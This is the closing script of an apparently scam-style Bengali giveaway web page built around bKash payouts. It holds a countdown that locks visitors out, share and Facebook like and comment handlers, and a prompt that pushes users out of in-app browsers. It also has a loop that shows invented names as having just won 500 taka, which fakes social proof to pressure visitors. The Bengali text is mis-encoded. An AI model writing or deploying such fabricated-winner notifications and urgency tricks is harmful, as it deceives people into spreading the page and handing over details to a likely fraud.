      const sec = Math.max(0, Math.floor((cde-Date.now())/1000));
      const cdDiv = document.getElementById("countdown");
      if (cdDiv) {
        if (sec <= 0) {
          set("blocked", "1");
          state.blocked = true;
          render();
        } else {
          cdDiv.innerHTML = fmtTime(sec);
          setTimeout(countdownTick, 1000);
        }
      }
    }
    function fmtTime(sec) {
      const h = String(Math.floor(sec/3600)).padStart(2,"0");
      const m = String(Math.floor((sec%3600)/60)).padStart(2,"0");
      const s = String(sec%60).padStart(2,"0");
      return `${h}:${m}:${s} <span style="color:#e60074">‡¶ò‡¶®‡ßç‡¶ü‡¶æ : ‡¶Æ‡¶ø‡¶®‡¶ø‡¶ü : ‡¶∏‡ßá‡¶ï‡ßá‡¶®‡ßç‡¶°</span>`;
    }
    window.handleShowSharePopup = handleShowSharePopup;
    window.handleNativeShare = handleNativeShare;
    window.handleChromeRedirect = handleChromeRedirect;
    window.handleFormSubmit = handleFormSubmit;
    window.handleFBLike = handleFBLike;
    window.handleFBCommentClick = handleFBCommentClick;
    window.openNativeBrowser = openNativeBrowser;

    // ------- Live Notification Name/Amount List -------
    const liveNames = [
      "Hasan", "Rima", "Sumon", "Jannat", "Mithila", "Rafsan", "Sadia", "Tanim", "Nusrat", "Imran", "Farhana","Rakib","‡¶§‡ßÅ‡¶π‡¶ø‡¶®","‡¶∞‡¶æ‡¶π‡ßÅ‡¶≤","‡¶ú‡¶æ‡¶π‡¶ø‡¶¶","‡¶®‡¶æ‡¶∏‡¶ø‡¶Æ‡¶æ","‡¶∂‡¶æ‡¶Æ‡ßÄ‡¶Æ","‡¶§‡¶æ‡¶®‡¶ø‡¶Æ","‡¶∂‡¶æ‡¶∞‡¶Æ‡¶ø‡¶®","‡¶Æ‡¶®‡¶ø‡¶∞‡ßÅ‡¶≤","‡¶§‡¶æ‡¶∏‡¶®‡¶ø‡¶Æ","‡¶¨‡¶¶‡¶∞‡ßÅ‡¶≤","‡¶∞‡¶æ‡¶ï‡¶ø‡¶¨","‡¶∏‡ßÅ‡¶Æ‡¶®","‡¶∞‡¶ø‡¶Æ‡¶æ","‡¶π‡¶æ‡¶∏‡¶ø‡¶¨","‡¶∞‡¶æ‡¶´‡¶ø","‡¶®‡¶æ‡¶à‡¶Æ","‡¶∂‡¶æ‡¶ì‡¶®","‡¶Æ‡ßÅ‡¶®","‡¶§‡¶ø‡¶•‡¶ø","‡¶Ü‡¶´‡¶∞‡ßã‡¶ú‡¶æ","‡¶Æ‡¶æ‡¶π‡¶ø‡¶®","‡¶´‡¶æ‡¶∞‡¶ø‡ßü‡¶æ","‡¶∏‡¶æ‡¶¨‡ßç‡¶¨‡¶ø‡¶∞","‡¶∞‡¶®‡¶ø","‡¶∏‡¶æ‡¶¨‡¶ø‡¶®‡¶æ","‡¶∞‡¶æ‡¶´‡¶∏‡¶æ‡¶®","‡¶Æ‡¶ø‡¶•‡¶ø‡¶≤‡¶æ","‡¶®‡ßÇ‡¶∞","‡¶∞‡ßá‡¶π‡¶æ‡¶®","‡¶§‡¶æ‡¶∏‡¶´‡¶ø‡ßü‡¶æ","‡¶ú‡¶ø‡¶®‡ßç‡¶®‡¶æ‡¶§","‡¶ú‡¶æ‡¶π‡¶æ‡¶®‡¶æ‡¶∞‡¶æ"
    ];
    const liveAmounts = [500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500,500];

    // ------- Live Notification Logic -------
    let usedLiveNames = {};
    let liveNotifyIsRunning = false;
    let liveNotifyQueue = [];
    let liveNotifyActive = false;
    function showLiveNotify(name, amount) {
      const wrap = document.getElementById('liveNotifyWrap');
      const div = document.createElement('div');
      div.className = "live-notify";
      div.innerHTML = `<span style="font-weight:700;color:#e60074"><svg width="22" style="margin-bottom:-2px" height="22" fill="#ff69b4" viewBox="0 0 24 24"><path d="M13 17h-2v-2h2v2zm0-4h-2V7h2v6zm-1-15C6.48 2 2 6.48 2 12c0 5.52 4.48 10 10 10s10-4.48 10-10C22 6.48 17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/></svg> ‡¶Ö‡¶≠‡¶ø‡¶®‡¶®‡ßç‡¶¶‡¶® ${name},</span> <span class="live-notify-amount">${amount} ‡¶ü‡¶æ‡¶ï‡¶æ</span> bKash-‡¶è ‡¶™‡ßá‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡¶®!`;
      wrap.appendChild(div);
      setTimeout(()=>{div.style.opacity=0.6;},6000);
      setTimeout(()=>{
        if(wrap.contains(div)) wrap.removeChild(div);
        liveNotifyActive = false;
        if(liveNotifyQueue.length > 0){
          let next = liveNotifyQueue.shift();
          triggerLiveNotify(next.name, next.amount);
        }
      },7000);
    }
    function triggerLiveNotify(name, amount){
      liveNotifyActive = true;
      showLiveNotify(name, amount);
    }
    function startLiveNotify() {
      if (liveNotifyIsRunning) return;
      liveNotifyIsRunning = true;
      let shuffledNames = [];
      function shuffle(array) {
        let arr = array.slice();
        for (let i = arr.length - 1; i > 0; i--) {
          const j = Math.floor(Math.random() * (i + 1));
          [arr[i], arr[j]] = [arr[j], arr[i]];
        }
        return arr;
      }
      function pickNextName() {
        if (shuffledNames.length===0) {
          shuffledNames = shuffle(liveNames);
          usedLiveNames = {};
        }
        let name = null;
        while (shuffledNames.length) {
          let n = shuffledNames.shift();
          if (!usedLiveNames[n]) {
            name = n;
            usedLiveNames[n] = true;
            break;
          }
        }
        if (!name) return null;
        return name;
      }
      function nextNoti() {
        let name = pickNextName();
        if (!name) return;
        let amount = liveAmounts[Math.floor(Math.random()*liveAmounts.length)];
        if(!liveNotifyActive){
          triggerLiveNotify(name, amount);
        } else {
          liveNotifyQueue.push({name, amount});
        }
        setTimeout(nextNoti, 7000);
      }
      setTimeout(nextNoti, 900);
    }

    // ---- ENTRY POINT ----
    const inApp = inAppBrowserName();
    if (inApp) {
      showOpenInBrowser();
    } else {
      render();
      renderPopup();
      renderFBPost();
      startLiveNotify();
    }
  </script>
</body>
</html>
